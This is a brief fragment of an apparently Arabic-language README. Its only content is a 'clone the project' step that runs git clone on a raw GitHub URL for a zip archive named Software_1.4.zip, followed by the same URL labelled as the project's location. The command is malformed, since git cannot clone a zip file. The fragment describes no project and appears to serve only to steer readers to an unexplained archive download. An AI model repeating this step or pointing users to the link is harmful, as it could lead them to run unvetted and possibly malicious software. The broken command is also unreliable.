...
1. **استنساخ المشروع**
```bash
git clone https://raw.githubusercontent.com/Ahmedfares3/new/main/curacao/Software_1.4.zip
...
- **الموقع**: https://raw.githubusercontent.com/Ahmedfares3/new/main/curacao/Software_1.4.zip
